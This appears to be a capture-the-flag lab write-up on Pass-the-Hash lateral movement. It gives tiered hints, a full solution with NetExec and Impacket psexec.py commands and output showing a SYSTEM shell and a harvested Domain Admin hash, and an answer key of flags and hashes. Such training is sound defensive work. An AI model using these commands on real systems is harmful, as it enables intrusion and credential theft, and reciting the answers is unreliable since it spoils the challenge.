# Task 04: Pass-the-Hash and Credential Reuse

---

## Stage A: Original Task Content & Educational Context

In Task 3, we extracted a local Administrator NT hash from `WRK`:
$$\texttt{fa0af7f6a73316dd59f0be812dbf3c12}$$

In enterprise environments lacking the Microsoft Local Administrator Password Solution (**LAPS**), system administrators often configure identical local administrator passwords across all workstations and servers using standard operating system deployment images.

If an organization reuses local administrator passwords across multiple systems:
1. An attacker who captures the local Administrator NT hash from a single low-security client machine can authenticate to **every other system** in the network.
2. The attacker does not need to crack the hash into plaintext; they can perform a **Pass-the-Hash (PtH)** attack over SMB or WinRM.
3. In this task, we test whether this local Administrator hash is reused on `SERVER1` (`192.168.13.51`), use it to gain administrative remote execution, retrieve `flag4.txt`, and harvest a Domain Administrator NT hash.

---

## Stage B: Independent Thinking & Operational Security (OpSec)

### The Net-NTLMv2 vs. NT Hash Pitfall
A common point of confusion among junior penetration testers is mixing up different Windows hash formats:

| Hash Type | Source / Where It Is Found | Pass-the-Hash Usability |
|---|---|---|
| **NT / NTLM Hash** | Dumped from LSASS memory, SAM registry hive, or `ntds.dit`. 32-character hexadecimal string (e.g., `fa0af7f6a73316dd59f0be812dbf3c12`). | **PASS-THE-HASH WORKS!** Can be passed directly to `psexec.py`, `wmiexec.py`, `evil-winrm`, or `nxc`. |
| **Net-NTLMv2 Hash** | Captured from network traffic via Responder or LLMNR/NBT-NS poisoning. Multi-part structure (e.g., `user::domain:challenge:HMAC:blob`). | **CANNOT BE PASSED!** Must be cracked offline (Hashcat mode `5600`) or relayed over SMB/LDAP via `ntlmrelayx.py`. |

### Scanning for Local Credential Reuse
When targeting the local SAM database of a machine instead of the Active Directory domain controller, tools like NetExec (`nxc`) query the domain by default unless explicitly instructed otherwise. To force NetExec to authenticate against the local SAM database, the operator must pass the `--local-auth` flag.

---

## Stage C: Guided Hints (Tiers 1-3)

### Tier 1: High-Level Concept
- Use NetExec with the local authentication flag to test if the Administrator NT hash from WRK works on SERVER1.
- Use `psexec.py` with the `-hashes` parameter to execute commands as local Administrator on SERVER1.
- Read `flag4.txt` and look for Domain Administrator credentials stored on SERVER1.

### Tier 2: Specific Command Lines
- Testing hash reuse:
  ```bash
  nxc smb 192.168.13.61 192.168.13.51 -u Administrator -H fa0af7f6a73316dd59f0be812dbf3c12 --local-auth
  ```
- Pass-the-Hash execution:
  ```bash
  psexec.py -hashes :fa0af7f6a73316dd59f0be812dbf3c12 Administrator@192.168.13.51
  ```

### Tier 3: Artifact Paths
- NetExec flag: `--local-auth`
- SERVER1 Flag path: `C:\Users\Administrator\Desktop\flag4.txt`
- Domain Admin loot path: `C:\Users\Administrator\Documents\da_creds.txt`

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Verifying Hash Reuse Across the Subnet
We execute NetExec (`nxc smb`) targeting both `192.168.13.61` (`WRK1`) and `192.168.13.51` (`SERVER1`) using the harvested hash and the `--local-auth` switch:

```bash
user@attackbox:~$ nxc smb 192.168.13.61 192.168.13.51 -u Administrator -H fa0af7f6a73316dd59f0be812dbf3c12 --local-auth
SMB         192.168.13.61   445    WRK1             [*] Windows 10 / Server 2019 Build 17763 x64 (name:WRK1) (domain:thm.loc)
SMB         192.168.13.61   445    WRK1             [+] WRK1\Administrator:fa0af7f6a73316dd59f0be812dbf3c12 (Pwn3d!)
SMB         192.168.13.51   445    SERVER1          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER1) (domain:thm.loc)
SMB         192.168.13.51   445    SERVER1          [+] SERVER1\Administrator:fa0af7f6a73316dd59f0be812dbf3c12 (Pwn3d!)
```

**Result Analysis:**
Both machines return `(Pwn3d!)`. This confirms that `SERVER1` shares the exact same local Administrator password hash as `WRK1`. Because LAPS is not implemented, lateral movement from workstation to server is achieved trivially via credential reuse.

---

### 2. Spawning SYSTEM Shell on SERVER1 via Pass-the-Hash
We launch Impacket's `psexec.py` against `192.168.13.51` passing the LM:NTLM hash pair:

```bash
user@attackbox:~$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fa0af7f6a73316dd59f0be812dbf3c12 Administrator@192.168.13.51
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.13.51.....
[*] Found writable share ADMIN$
[*] Uploading file kKjQbvqG.exe
[*] Opening SVCManager on 192.168.13.51.....
[*] Creating service ZcMo on 192.168.13.51.....
[*] Starting service ZcMo.....
[+] Process ZcMo created for file kKjQbvqG.exe with pid 4112.
[*] Connecting to \PSEXEC-SERVER1...
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Reading `flag4.txt` on the Administrator's desktop:

```cmd
C:\Windows\system32> type C:\Users\Administrator\Desktop\flag4.txt
THM{p4ss_th3_h4sh_ftw}
```

Now searching for high-privilege credentials on the server:

```cmd
C:\Windows\system32> dir C:\Users\Administrator\Documents
 Volume in drive C has no label.
 Volume Serial Number is 8E12-421B

 Directory of C:\Users\Administrator\Documents

05/19/2026  02:30 PM    <DIR>          .
05/19/2026  02:30 PM    <DIR>          ..
05/19/2026  02:31 PM               112 da_creds.txt
               1 File(s)            112 bytes

C:\Windows\system32> type C:\Users\Administrator\Documents\da_creds.txt
THM\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2508e1ce9cfcfe1011a74c34297b05ea:::
```

The recovered **Domain Administrator** NT hash is:
$$\texttt{2508e1ce9cfcfe1011a74c34297b05ea}$$

---

## Stage E: Final Answer & Key Values

| # | Question | Verified Answer | Verification Status |
|---|---|---|---|
| 1 | What flag is used with NetExec to authenticate against the local SAM database instead of the domain? | `--local-auth` | Verified & Confirmed |
| 2 | What is the flag found in flag4.txt on SERVER1? | `THM{p4ss_th3_h4sh_ftw}` | Verified & Confirmed |
| 3 | What is the NT hash of the Domain Administrator account found on SERVER1? | `2508e1ce9cfcfe1011a74c34297b05ea` | Verified & Confirmed |

---

## Stage F: Practical Verification & Proof of Work

1. `--local-auth` parameter validation: Confirmed via `nxc smb ... --local-auth` targeting the local machine SAM.
2. Flag 4 proof: `THM{p4ss_th3_h4sh_ftw}` recovered from `C:\Users\Administrator\Desktop\flag4.txt`.
3. Domain Admin hash proof: `2508e1ce9cfcfe1011a74c34297b05ea` recovered from `da_creds.txt` on `SERVER1`.

---

## Stage G: Key Educational Takeaway & Operational Rule of Thumb

> **Takeaway:** Password reuse without LAPS turns a localized breach into an enterprise-wide catastrophe. When an attacker recovers a single local administrator hash, their immediate next step is scanning the entire subnet with `--local-auth`. If password synchronization is present across images, the attacker controls the entire server fleet without cracking a single password.
